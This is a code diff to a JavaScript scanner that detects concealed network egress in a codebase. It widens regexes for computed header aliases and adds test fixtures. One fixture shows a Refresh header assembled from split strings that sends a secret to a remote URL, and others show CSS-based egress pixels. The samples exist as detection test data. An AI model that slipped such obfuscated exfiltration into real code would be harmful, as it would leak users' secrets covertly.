@@ -2055,9 +2055,9 @@ function hasAiRuntimeBoundary(content, path = "") {
   const hasObscuredResponseCapability = /\bnew\s*\(\s*(?:Response|Headers)\s*\)/.test(normalizedContent)
     || /=\s*(?:\(\s*)*(?:Response|Headers)\b/.test(normalizedContent)
     || /\b(?:Response|Headers)\.(?:bind|call|apply)\b/.test(normalizedContent);
-  const computedHeadersInitAliases = [...normalizedContent.matchAll(/\bconst\s+([A-Za-z_$][\w$]*)\s*=\s*\[\s*\[\s*(?!["'`])/g)]
+  const computedHeadersInitAliases = [...normalizedContent.matchAll(/\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*(?::[^=;]+)?=\s*\[\s*\[(?!\s*["'`])\s*/g)]
     .map((match) => match[1]);
-  const hasComputedHeadersInit = /(?:\bheaders\s*:|\bnew\s+Headers\s*\()\s*\[\s*\[\s*(?!["'`])/i.test(normalizedContent)
+  const hasComputedHeadersInit = /(?:\bheaders\s*:|\bnew\s+Headers\s*\()\s*\[\s*\[(?!\s*["'`])\s*/i.test(normalizedContent)
     || computedHeadersInitAliases.some((alias) => new RegExp(`(?:\\bheaders\\s*:\\s*|\\bnew\\s+Headers\\s*\\(\\s*)${alias}\\b`).test(normalizedContent));
   const hasComputedResponseHeader = /\bheaders\s*:\s*\{[^}]*\[[^\]]+\]\s*:/i.test(normalizedContent)
     || /\bnew\s+Headers\s*\(\s*\{[^}]*\[[^\]]+\]\s*:/i.test(normalizedContent)
@@ -2337,6 +2337,7 @@ for (const fixture of [
   { content: 'const name = "Ref" + "resh"; return new Response("", { headers: { [name]: `0; url=${env.REMOTE_URL}?data=${secret}` } });', path: "apps/worker/src/capture-router.ts" },
   { content: 'const name = "Ref" + "resh"; return new Response("", { headers: [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]] });', path: "apps/worker/src/capture-router.ts" },
   { content: 'const name = "Ref" + "resh"; const init = [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]]; return new Response("", { headers: init });', path: "apps/worker/src/capture-router.ts" },
+  { content: 'const name = "Ref" + "resh"; const init: HeadersInit = [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]]; return new Response("", { headers: init });', path: "apps/worker/src/capture-router.ts" },
   { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
   { content: '<div style="background-image:image-set(\'//api.groq.com/pixel\' 1x)"></div>', path: "apps/brand-site/public/css-image-set-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
@@ -2347,6 +2348,7 @@ for (const fixture of [
 }
 
 for (const fixture of [
+  { content: 'return new Response("ok", { headers: [[ "Content-Type", "text/plain" ]] });', path: "apps/worker/src/capture-router.ts" },
   { content: "select 1 as x, 'execute';", path: "supabase/migrations/99999999999999-safe-select-alias.sql" },
   { content: "select 'ordinary literal';", path: "supabase/migrations/99999999999999-safe-literal.sql" },
   { content: "perform set_config('app.manual_publish_context', 'on', true);", path: "supabase/migrations/99999999999999-approved-transaction-context.sql" },
